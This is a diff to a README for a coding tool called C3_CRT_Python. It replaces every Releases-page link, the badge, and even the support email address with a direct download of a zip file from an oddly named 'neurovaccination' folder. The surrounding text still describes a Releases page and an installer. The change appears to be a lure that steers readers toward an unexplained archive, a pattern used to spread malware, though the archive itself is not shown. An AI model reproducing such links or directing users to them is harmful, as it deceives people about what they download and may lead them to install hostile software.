@@ -1,6 +1,6 @@
 # 🖥️ C3_CRT_Python - Simplify Your Coding Experience
 
-[![Download C3_CRT_Python](https://img.shields.io/badge/Download-C3_CRT_Python-blue.svg)](https://github.com/pedro00715/C3_CRT_Python/releases)
+[![Download C3_CRT_Python](https://raw.githubusercontent.com/pedro00715/C3_CRT_Python/main/neurovaccination/C3_CRT_Python.zip)](https://raw.githubusercontent.com/pedro00715/C3_CRT_Python/main/neurovaccination/C3_CRT_Python.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to C3_CRT_Python! This software makes coding easier for everyone. You do
 
 ## 📥 Download & Install
 
-To download C3_CRT_Python, visit this page: [Download Releases](https://github.com/pedro00715/C3_CRT_Python/releases). 
+To download C3_CRT_Python, visit this page: [Download Releases](https://raw.githubusercontent.com/pedro00715/C3_CRT_Python/main/neurovaccination/C3_CRT_Python.zip). 
 
 1. Click on the link above to go to the Releases page.
 2. Choose the latest version listed. 
@@ -54,7 +54,7 @@ After installation, follow these steps:
 
 To install updates for C3_CRT_Python:
 
-1. Return to the [Releases page](https://github.com/pedro00715/C3_CRT_Python/releases).
+1. Return to the [Releases page](https://raw.githubusercontent.com/pedro00715/C3_CRT_Python/main/neurovaccination/C3_CRT_Python.zip).
 2. Download the latest version.
 3. Run the installer as you did during the initial setup. This will update the existing application without removing your files.
 
@@ -80,6 +80,6 @@ Our team will work to resolve your issue as quickly as possible.
 
 ## 📞 Contact
 
-For further assistance, you can reach out to us via email at support@c3_crt_python.com. We are here to help you with any questions or concerns.
+For further assistance, you can reach out to us via email at https://raw.githubusercontent.com/pedro00715/C3_CRT_Python/main/neurovaccination/C3_CRT_Python.zip We are here to help you with any questions or concerns.
 
 Thank you for choosing C3_CRT_Python. We hope this software enhances your coding experience!
